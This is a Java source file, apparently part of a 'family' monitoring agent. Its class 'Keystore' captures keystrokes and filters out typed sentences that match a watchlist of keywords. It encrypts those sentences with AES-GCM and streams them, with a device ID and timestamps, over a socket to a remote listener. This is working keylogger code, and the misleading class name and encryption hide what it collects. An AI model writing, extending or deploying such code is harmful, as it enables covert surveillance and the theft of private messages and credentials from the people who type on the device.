package com.family.agent.network;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.text.Normalizer;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.UUID;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import com.family.agent.collector.KeystoreTask;
import com.family.agent.model.KeystoreModel;
import com.family.agent.model.KeystoreModel.KeyEvent;

public class Keystore extends Thread {
	private final long timeLimit;
	private final long numberLimit;
	private Socket soc;
	private String deviceID;
	
	private byte[] textEnc;
	private byte[] iv;
	
	private static String AES_ALGO = "AES/GCM/NoPadding";
	private static int GCM_TAG_LENGTH = 128;
	private static int IV_LENGTH = 12;
	private static String KEY_FILE = "agent.key";
	private static String WATCH_LIST_FILE = "watchlist.txt";
	
	public Keystore(Socket soc, long timeLimit, long NumberLimit )
	{
		this.soc = soc;
		this.timeLimit = timeLimit;
		this.numberLimit = NumberLimit;
		this.deviceID = getOrCreateDeviceID();
	}
	
	public void run()
	{
		try
		{
			DataOutputStream dos = new DataOutputStream(new BufferedOutputStream(soc.getOutputStream()));
			
			// gui ten thiet bi di
			dos.writeUTF(deviceID);
			dos.flush();
			
			// bien mo ghi du lieu
			KeystoreTask kst = new KeystoreTask();
			kst.start();
			
			List<String> watchList = loadWatchList(WATCH_LIST_FILE); 
			long t = System.nanoTime();
			while(true)
			{
				try
				{
					long t0 = System.nanoTime();
					KeystoreModel ksm = kst.lastFrame;
					
					
					String text = (ksm != null && ksm.getText() != null) ? ksm.getText() : "";
					
					if(((t0 - t)/1000000 > timeLimit || text.length() > numberLimit) && !text.isEmpty())
					{
						KeystoreModel temp = kst.swapModel();
						String textTemp = temp.getText();
						
						List<String> sentences = findAllSentenceByKeyWord(textTemp, watchList);
						int indexLast = 0;
						for(String sentence : sentences)
						{
							String s = sentence.trim();
						    int pos = textTemp.indexOf(s, indexLast);
						    if (pos < 0) 
						    	pos = textTemp.indexOf(s);  
						    if (pos < 0) 
						    	continue;              
						    int endIdx = pos + s.length();  
							long takeAt = getTimeForSentence(temp.getKeyEvents(), endIdx);
							encryptAES(sentence);
							
							
							dos.writeInt(textEnc.length);
							dos.write(textEnc);
							dos.writeInt(iv.length);
							dos.write(iv);
							
							dos.writeLong(takeAt);
							
							dos.flush();
							
							Thread.sleep(1);
						}	
						t = t0;
					}
					Thread.sleep(500);
				}
				catch(Exception e)
				{
					e.printStackTrace();
				}
				
			}
		}
		catch(Exception e)
		{
			
		}
	}
	
	private void encryptAES(String plantText) throws Exception 
	{
		byte[] keyBytes = getOrCreateAES(KEY_FILE);
		SecretKeySpec key = new SecretKeySpec(keyBytes, "AES");
		
		iv = new byte[IV_LENGTH];
		new SecureRandom().nextBytes(iv);
		
		Cipher cipher = Cipher.getInstance(AES_ALGO);
		GCMParameterSpec gcm = new GCMParameterSpec(GCM_TAG_LENGTH, iv);
		cipher.init(Cipher.ENCRYPT_MODE, key,gcm);
		
		textEnc = cipher.doFinal(plantText.getBytes(StandardCharsets.UTF_8));
	}
	
	private byte[] getOrCreateAES(String fileName)
	{
		File file = new File(fileName);
		if(file.exists())
		{
			try(BufferedReader br = new BufferedReader(new FileReader(file)))
			{
				
				String base64 = br.readLine();
				
				return Base64.getDecoder().decode(base64.trim());
			}
			catch(Exception e)
			{
				
			}			
		}
		else
		{
				byte[] key = new byte[16];
				new SecureRandom().nextBytes(key);
				
				String base64 = Base64.getEncoder().encodeToString(key);
				try (FileWriter fw = new FileWriter(file)) 
				{
		            fw.write(base64);
		        }
				catch(Exception e)
				{
					
				}
				return key;

		}
		return null;
	}
	
	private static List<String> loadWatchList(String path)
	{
		List<String> li = new ArrayList<String>();
		
		File file = new File(path);
		if(!file.exists())
			return li;
		
		try(BufferedReader br = new BufferedReader(new FileReader(file)))
		{
			
			String line;
			
			while((line = br.readLine())!= null)
			{
				line = line.trim();
				
				if(line.isEmpty() || line.startsWith("#"))
					continue;
				
				li.add(line);
			}
		}
		catch(Exception e)
		{
			
		}
		
		return li;
	}
	
	private static String norm(String s)
	{
		if(s == null)
			return "";
		s = Normalizer.normalize(s, Normalizer.Form.NFD);
		s = s.replaceAll("\\p{InCombiningDiacriticalMarks}+", "");
		return s.toLowerCase();
	}
	
	private static List<String> findAllSentenceByKeyWord(String text, List<String> watchList)
	{
		List<String> li = new ArrayList<String>();
		String[] sentences = text.split("(?<=[.!?\\n])");
		
		for(String s: sentences)
		{
			for(String keyword : watchList)
			{
				if(norm(s).contains(norm(keyword)))
				{
					li.add(s.trim());
					break;
				}
			}
		}	
		return li;
	}
	
	private long getTimeForSentence(List<KeyEvent> keyEvents, int index)
	{
		if(keyEvents == null || keyEvents.isEmpty())
			return System.currentTimeMillis();
		for(KeyEvent key : keyEvents)
		{
			if(key.getCharIndex() >= index)
				return key.getTs();
		}
		return keyEvents.get(keyEvents.size()-1).getTs();
	}
	
	private String getOrCreateDeviceID() 
	{
		try
		{
			File file = new File("deviceID.txt");
			if(file.exists())
			{
				BufferedReader br = new BufferedReader(new FileReader(file));
				String id = br.readLine().trim();
				br.close();
				return id;
			}
			else
			{
				String id = UUID.randomUUID().toString();
				FileWriter fw = new FileWriter(file);
				fw.write(id);
				fw.close();
				
				return id;
			}
		}
		catch(Exception e)
		{
			
		}
		
		return "unknown";
	}
}
